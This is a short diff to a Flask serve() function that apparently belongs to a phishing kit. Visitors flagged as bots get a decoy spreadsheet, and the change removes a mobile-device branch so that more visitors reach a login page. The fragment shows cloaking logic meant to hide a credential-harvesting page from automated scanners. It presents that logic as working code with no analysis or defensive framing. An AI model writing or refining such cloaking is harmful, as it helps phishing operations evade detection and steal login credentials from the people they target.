@@ -169,11 +169,7 @@ def serve(path):
         print("redirected bot detected")
         return send_from_directory(files_folder,"form.xlsx")
 
-    # Check if device is not a PC, serve index.html instead
-    if device_type != "pc":
-        print("Non-PC device detected, serving index.html")
-        return send_from_directory(files_folder, "index.html")
-
+        
     print("Works perfectly heading to login")
    
     if path != "" and os.path.exists(os.path.join(app.static_folder, path)):
